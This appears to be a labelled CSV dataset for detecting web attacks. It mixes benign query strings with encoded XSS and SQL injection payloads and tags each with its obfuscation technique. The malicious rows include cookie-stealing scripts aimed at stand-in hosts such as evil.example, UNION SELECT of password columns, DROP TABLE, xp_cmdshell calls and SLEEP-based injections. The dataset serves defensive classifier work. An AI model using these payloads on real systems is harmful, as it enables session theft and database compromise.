payload,label,techniques
%253Csvg%2520onload%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
view=grid&city=surakarta&theme=dark,benign,
"%3Ca href%3D""javascript:alert(1)%22>click</a%3E",xss,partial_url_encode
format=json&price_max=5665&sort=desc,benign,
city=foxtrot&color=camera,benign,
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode+whitespace
q=delta,benign,
%3Cscript%3Enew%20Image%28).src=%27http%3A%2F%2Fevil.example/%3Fc%3D'+document.cookie;%3C%2Fscript>,xss,partial_url_encode+whitespace
city=shoes&limit=526&size=m,benign,
%253Csvg%2520onload%253Dalert%25281%2529%3E,xss,partial_url_encode+comment_insertion+url_encode
%27%20OR%201%3D1%20--,sqli,url_encode+comment_insertion
<img%0asrc=x%0aonerror=this.src='http://evil.example/'+document.cookie>,xss,whitespace
page=2882&coupon=citra&city=budget,benign,
%27><script>alert%281)%3C/script>,xss,whitespace+case_toggle+partial_url_encode
%22%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--,sqli,url_encode
session=558d929&lang=id&category=foxtrot,benign,
\u003Cscript&%2362;alert%28document.cookie%29%26%2360%3B/script%26gt;,xss,unicode_substitution+partial_url_encode
<script>alert(document.cookie)</script>,xss,whitespace
1%252520OR%2525201%25253D1,sqli,comment_insertion+double_url_encode+url_encode
session=520f8e5,benign,
session=1def43e&color=phone&currency=usd,benign,
"1;%09ExEc/**/xp_cmdshell('dir')
--",sqli,case_toggle+whitespace
email=foxtrot@example.com,benign,
limit=9425,benign,
session=1de42ed&limit=7904&price_max=5583,benign,
"'/**/OR
'a'='a",sqli,whitespace
price_min=437&user_id=4351,benign,
\u003Cstyle&gt;@import &#39;http://evil.example/xss.css';&lt;/style>,xss,case_toggle+unicode_substitution+comment_insertion
session=3521f30,benign,
%252527%252529%25252520OR%25252520%252528%2525271%25252527%2525253D%252525271,sqli,partial_url_encode+url_encode+double_url_encode
session=391974f&sort=asc,benign,
session=4ef7eb7&redirect=/home,benign,
user_id=1261,benign,
q=orders&sort=desc,benign,
%253Cdetails%252520open%252520ontoggle%25253Dalert%25281%2529%25253E,xss,partial_url_encode+double_url_encode
qty=2763&session=5b90675,benign,
id=576,benign,
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode
"admin\u0027
--",sqli,partial_url_encode+whitespace+unicode_substitution
%2527%2520OR%2520SLEEP%2525287%2529%25253D%2525270,sqli,partial_url_encode+double_url_encode+unicode_substitution
%2527%2520OR%252520%25271%2527%253D%2525271,sqli,double_url_encode+partial_url_encode+unicode_substitution
color=foxtrot&view=grid&format=json,benign,
city=budi&id=150,benign,
\u003Cmarquee onstart=alert\u00281)\u003E,xss,unicode_substitution
offset=4912&session=2919ab6,benign,
sort=asc&price_min=6358&view=grid,benign,
limit=9336&ref=orders,benign,
sort=desc&search=settings&color=budi,benign,
%27%20uNion%20SeLect%20username%2C%20password%20froM%20users%20--,sqli,case_toggle+url_encode
category=phone,benign,
%25253Cscript%25253Ealert%252528%252527xss%252527%252529%25253C%25252Fscript%25253E,xss,url_encode+double_url_encode+unicode_substitution
\u0027%20AND %28SELECT COUNT%28*\u0029 FROM%20users%29 %3E%200 --,sqli,partial_url_encode+unicode_substitution
<input onfocus=alert(1) autofocus>,xss,comment_insertion
lang=en&coupon=settings&price_max=6690,benign,
price_max=7106,benign,
email=budi@example.com&session=d7ca65&format=json,benign,
qty=8815,benign,
<input/**/onfocus=alert(1)%0aautofocus>,xss,whitespace
%27%20or%2520SLEEP%252810%2529%253D%25270,sqli,case_toggle+partial_url_encode+url_encode
page=4263,benign,
<script>alert('xss')</script>,xss,case_toggle
<iframe%0asrc=javascript:alert(1)>,xss,whitespace+comment_insertion
%3Cimg	src=x%09onerror=this.src=&#39;http://bad-host.example/\u0027+document.cookie\u003E,xss,unicode_substitution+whitespace+case_toggle
currency=usd&price_min=945&id=7479,benign,
size=m&lang=id,benign,
ref=profile&email=report@example.com&q=book,benign,
%27%20Union%20sELECt%20username%2C%20password%20frOM%20users%20--,sqli,case_toggle+url_encode
category=alice&id=6542,benign,
id=528&price_min=5411&tab=foxtrot,benign,
%2527%25253B%2520DRop%252520TABLE%2520users%253B%2520--,sqli,partial_url_encode+case_toggle+double_url_encode
session=59b3e8e&tab=profile,benign,
qty=8729&token=4c6322d&offset=3288,benign,
theme=dark&format=json,benign,
%27%20OR%201%3D1%20--,sqli,url_encode+case_toggle
%2527%2520OR%2520%2527a%2527%253D%2527a,sqli,double_url_encode+comment_insertion
"""/**/OR/**/""1""=%221",sqli,partial_url_encode+whitespace
view=grid,benign,
token=1db6259&offset=4985,benign,
%27 OR '1%27='1,sqli,partial_url_encode+unicode_substitution
offset=5310,benign,
"\u0027;	dROP%09TABLE%09users;
--",sqli,case_toggle+unicode_substitution+whitespace
%3Ca%20href%253D%2522javascript%3Aalert%281%2529%22%253Eclick%3C%252Fa%3E,xss,url_encode+partial_url_encode+unicode_substitution
page=1466&coupon=shoes&redirect=/home,benign,
' OR SLEEP(5\u0029='0,sqli,unicode_substitution
1&#39; AND SLEEP\u00283%29 --,sqli,unicode_substitution
<video><source onerror=alert(1)></video>,xss,case_toggle
%2527%2509OR%252F%252A%252A%252F%255Cu0027a%2526%252339%253B%253D%255Cu0027a,sqli,unicode_substitution+whitespace+double_url_encode
format=json&lang=en,benign,
1'%0aAND	1%3D1%2509--,sqli,whitespace+partial_url_encode
<iframe src=javascript:alert(1)>,xss,case_toggle
limit=1220&format=json&session=d1abd9,benign,
